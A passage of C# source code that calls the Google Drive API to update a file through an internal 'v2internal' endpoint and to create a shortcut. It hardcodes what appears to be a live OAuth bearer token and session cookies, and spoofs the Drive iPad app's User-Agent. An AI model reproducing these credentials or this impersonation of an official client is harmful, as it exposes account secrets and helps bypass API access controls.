            var response = await _httpClient.PutAsync("https://www.googleapis.com/drive/v2internal/files/1G2_YakgSK6AmK2PpW9Tm9aWOGNr5g9Wk?enforceSingleParent=true&errorRecovery=false&languageCode=en&modifiedDateBehavior=DRIVE_UI_OFFLINE&openDrive=false&reason=912&supportsAllDrives=true&syncType=2&updateViewedDate=false&fields=kind%2Cparents%2Fid%2Ctitle%2CmimeType%2Clabels%2Fstarred%2Clabels%2Ftrashed%2Clabels%2Frestricted%2CcreatedDate%2CmodifiedDate%2CmodifiedByMeDate%2ClastViewedByMeDate%2CfileSize%2CalternateLink%2Cid%2Cshared%2CsharedWithMeDate%2CexplicitlyTrashed%2CquotaBytesUsed%2Ccapabilities%2FcanCopy%2Csubscribed%2CfolderColor%2Ccapabilities%2FcanDownload%2CprimarySyncParentId%2CfolderFeatures%2Cetag%2CexportLinks%2Cspaces%2CownedByMe%2Ccapabilities%2FcanEdit%2Ccapabilities%2FcanComment%2Crecency%2CrecencyReason%2Cversion%2CactionItems%2Ccapabilities%2FcanAddChildren%2Ccapabilities%2FcanDelete%2Ccapabilities%2FcanRemoveChildren%2Ccapabilities%2FcanShare%2Ccapabilities%2FcanTrash%2Ccapabilities%2FcanManageMembers%2Ccapabilities%2FcanManageVisitors%2CdriveId%2Ccapabilities%2FcanRename%2ChasAugmentedPermissions%2Ccapabilities%2FcanReadDrive%2Ccapabilities%2FcanMoveTeamDriveItem%2CprimaryDomainName%2CorganizationDisplayName%2CpassivelySubscribed%2CtrashedDate%2Ccapabilities%2FcanShareAsCommenter%2Ccapabilities%2FcanShareAsFileOrganizer%2Ccapabilities%2FcanShareAsOrganizer%2Ccapabilities%2FcanShareAsReader%2Ccapabilities%2FcanShareAsWriter%2Ccapabilities%2FcanShareAsOwner%2Ccapabilities%2FcanSharePublishedViewAsReader%2ChasVisitorPermissions%2Ccapabilities%2FcanMoveItemOutOfDrive%2CpairedDocType%2Cdetectors%2CblockingDetectors%2CwarningDetectors%2Ccapabilities%2FcanModifyContentRestriction%2CcontentRestrictions%2FreadOnly%2CcontentRestrictions%2Freason%2Ccapabilities%2FcanShareToAllUsers%2CworkspaceIds%2Cproperties%2Ccapabilities%2FcanModifyContent%2Ccapabilities%2FcanMoveItemWithinDrive%2Ccapabilities%2FcanMoveItemOutOfDrive%2Ccapabilities%2FcanMoveChildrenWithinDrive%2Ccapabilities%2FcanMoveChildrenOutOfDrive%2Ccapabilities%2FcanDeleteChildren%2Ccapabilities%2FcanTrashChildren%2Ccapabilities%2FcanRequestApproval%2CapprovalMetadata%2FapprovalVersion%2Ccapabilities%2FcanReadCategoryMetadata%2CthumbnailVersion%2CshortcutDetails%2FtargetId%2CshortcutDetails%2FtargetMimeType%2CshortcutDetails%2FtargetLookupStatus%2CshortcutDetails%2FtargetFile%2CpermissionsSummary%28visibility%28type%29%29%2CpermissionsSummary%28visibility%28withLink%29%29%2Cowners%2Fid%2ClastModifyingUser%2Fid%2CsharingUser%2Fid%2Ccapabilities%2FcanAddMyDriveParent%2CcustomerId%2CancestorHasAugmentedPermissions%2Ccapabilities%2FcanShareChildFiles%2Ccapabilities%2FcanShareChildFolders%2Cowners%2FemailAddressFromAccount%2ClastModifyingUser%2FemailAddressFromAccount%2CsharingUser%2FemailAddressFromAccount%2Ccapabilities%2FcanMoveItemWithinDrive%2Ccapabilities%2FcanMoveItemOutOfDrive%2Ccapabilities%2FcanMoveChildrenWithinDrive%2Ccapabilities%2FcanAddFolderFromAnotherDrive%2CresourceKey%2CshortcutDetails%2FtargetResourceKey%2Ccapabilities%2FcanBlockOwner%2CcontainsUnsubscribedChildren",
                content);
            var responseData = await response.Content.ReadAsStringAsync();

            if (response.StatusCode == HttpStatusCode.OK)
            {
                Debug.WriteLine("OK!!!!!");
            }
            else
            {
                _errorResult = /*HttpWorkerRequest.GetStatusDescription*/((int)response.StatusCode).ToString();
                Debug.WriteLine(_errorResult);
            }
            //}

        }
        public async void Shortcut()
        {
            //using (var request = new HttpRequestMessage(new HttpMethod("PUT"), "https://www.googleapis.com/drive/v2/files/10zV9C93N_ulPMWYt8NDr1xjkN31KKdMf?enforceSingleParent=true&errorRecovery=false&languageCode=en&modifiedDateBehavior=DRIVE_UI_OFFLINE&openDrive=false&reason=912&supportsAllDrives=true&syncType=2&updateViewedDate=false&fields=kind%2Cparents%2Fid%2Ctitle%2CmimeType%2Clabels%2Fstarred%2Clabels%2Ftrashed%2Clabels%2Frestricted%2CcreatedDate%2CmodifiedDate%2CmodifiedByMeDate%2ClastViewedByMeDate%2CfileSize%2CalternateLink%2Cid%2Cshared%2CsharedWithMeDate%2CexplicitlyTrashed%2CquotaBytesUsed%2Ccapabilities%2FcanCopy%2Csubscribed%2CfolderColor%2Ccapabilities%2FcanDownload%2CprimarySyncParentId%2CfolderFeatures%2Cetag%2CexportLinks%2Cspaces%2CownedByMe%2Ccapabilities%2FcanEdit%2Ccapabilities%2FcanComment%2Crecency%2CrecencyReason%2Cversion%2CactionItems%2Ccapabilities%2FcanAddChildren%2Ccapabilities%2FcanDelete%2Ccapabilities%2FcanRemoveChildren%2Ccapabilities%2FcanShare%2Ccapabilities%2FcanTrash%2Ccapabilities%2FcanManageMembers%2Ccapabilities%2FcanManageVisitors%2CdriveId%2Ccapabilities%2FcanRename%2ChasAugmentedPermissions%2Ccapabilities%2FcanReadDrive%2Ccapabilities%2FcanMoveTeamDriveItem%2CprimaryDomainName%2CorganizationDisplayName%2CpassivelySubscribed%2CtrashedDate%2Ccapabilities%2FcanShareAsCommenter%2Ccapabilities%2FcanShareAsFileOrganizer%2Ccapabilities%2FcanShareAsOrganizer%2Ccapabilities%2FcanShareAsReader%2Ccapabilities%2FcanShareAsWriter%2Ccapabilities%2FcanShareAsOwner%2Ccapabilities%2FcanSharePublishedViewAsReader%2ChasVisitorPermissions%2Ccapabilities%2FcanMoveItemOutOfDrive%2CpairedDocType%2Cdetectors%2CblockingDetectors%2CwarningDetectors%2Ccapabilities%2FcanModifyContentRestriction%2CcontentRestrictions%2FreadOnly%2CcontentRestrictions%2Freason%2Ccapabilities%2FcanShareToAllUsers%2CworkspaceIds%2Cproperties%2Ccapabilities%2FcanModifyContent%2Ccapabilities%2FcanMoveItemWithinDrive%2Ccapabilities%2FcanMoveItemOutOfDrive%2Ccapabilities%2FcanMoveChildrenWithinDrive%2Ccapabilities%2FcanMoveChildrenOutOfDrive%2Ccapabilities%2FcanDeleteChildren%2Ccapabilities%2FcanTrashChildren%2Ccapabilities%2FcanRequestApproval%2CapprovalMetadata%2FapprovalVersion%2Ccapabilities%2FcanReadCategoryMetadata%2CthumbnailVersion%2CshortcutDetails%2FtargetId%2CshortcutDetails%2FtargetMimeType%2CshortcutDetails%2FtargetLookupStatus%2CshortcutDetails%2FtargetFile%2CpermissionsSummary%28visibility%28type%29%29%2CpermissionsSummary%28visibility%28withLink%29%29%2Cowners%2Fid%2ClastModifyingUser%2Fid%2CsharingUser%2Fid%2Ccapabilities%2FcanAddMyDriveParent%2CcustomerId%2CancestorHasAugmentedPermissions%2Ccapabilities%2FcanShareChildFiles%2Ccapabilities%2FcanShareChildFolders%2Cowners%2FemailAddressFromAccount%2ClastModifyingUser%2FemailAddressFromAccount%2CsharingUser%2FemailAddressFromAccount%2Ccapabilities%2FcanMoveItemWithinDrive%2Ccapabilities%2FcanMoveItemOutOfDrive%2Ccapabilities%2FcanMoveChildrenWithinDrive%2Ccapabilities%2FcanAddFolderFromAnotherDrive%2CresourceKey%2CshortcutDetails%2FtargetResourceKey%2Ccapabilities%2FcanBlockOwner%2CcontainsUnsubscribedChildren"))
            //{
            var content = new StringContent(("{\"name\": \"Test1\",\"mimeType\": \"application/vnd.google-apps.shortcut\",\"parents\": [],\"shortcutDetails\": {\"targetId\": \"1G2_YakgSK6AmK2PpW9Tm9aWOGNr5g9Wk\"}}"
                ));
            content.Headers.ContentType = MediaTypeHeaderValue.Parse("application/json");
            _httpClient.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue(@"*/*"));
            //_httpClient.DefaultRequestHeaders.Add("Connection", "keep-alive");
            //_httpClient.DefaultRequestHeaders.Add("Accept-Language", "en-us");
            //_httpClient.DefaultRequestHeaders.Add("Cookie", "NID=511=t125jVRq1M-tS6URRaRgnZc2HI4a8x_PVYFuoDIMlvs4mGluDq9lIzIoLcJZ5N5hb4u5SczBkf0zz7Qlz6_toEV__uVXMj69ZgWZ5JiBkQKTowDYDiw0SkMyYjUr6zk7NXfqsrBQrSxLKjUdflf4pwU5DVgbmbiImag7QIFHOlY");
            _httpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", "ya29.A0ARrdaM9OLYpXGVybgn6P-qxphYiAdjBLFnWU5nj5HBUDJdCAx63vOabkcljGwiCHmRD05QZBYmZJw7Dloz4giZLj9neaxFnXDHMRbFmKcd3IALSkHD53i2Dp-pz62s-irtkQ5qV157H3kWZkyuR_83FlIepjK-wSCLsrc8TTPDx1X6Cv1UH5nOlupRgVP5fGJFavLfF2ymXZqnaLLjbl6AdcruwpnhfnCFhn01W0ID2Wp2ySo_VvhovweFKF0Bu8W89t5szL8TxPdYt_2x1Tgpxz9SMD_Pt5PvI4f3_kKfAAcfLn5ZQVGxA2EhYg3cBHNWk");
            _httpClient.DefaultRequestHeaders.Add("User-Agent", @"com.google.Drive/4.2021.22202 iPad/12.4.7 hw/iPad4_4");
            //_httpClient.DefaultRequestHeaders.Add("Cookie", @"NID=511=qwZ4F_DKEwG7XS56oN4zNQVfy52fVFp1UMSf0xmEjcVH2-t_adH9JlWm3E2_hFq-0cAnI_cdOOZzBSEgEbx9l-AWrDIyHVUwDIJ7UbJQALD_syywsosurt_l6-iHU5HN2WR3bXUxwa79cCGYRBxKyCOLj3KnQBAKd9_s7_eG0jg");
            //_httpClient.DefaultRequestHeaders.IfMatch.Add(new EntityTagHeaderValue("\"1650470180000\""));
            //content.Headers.ContentLength = 28;
            //_httpClient.DefaultRequestHeaders.Add("Accept-Encoding", "gzip");


            var response = await _httpClient.PostAsync("https://www.googleapis.com/drive/v3/files", content);
            var responseData = await response.Content.ReadAsStringAsync();

            if (response.StatusCode == HttpStatusCode.OK)
            {
                Debug.WriteLine("OK!!!!!");
            }
            else
            {
                _errorResult = /*HttpWorkerRequest.GetStatusDescription*/((int)response.StatusCode).ToString();
                Debug.WriteLine(_errorResult);
            }
            //}

        }
        private void CheckError()
        {
            if (!string.IsNullOrEmpty(_errorResult))
                throw new Exception(_errorResult);
        }
    }
}
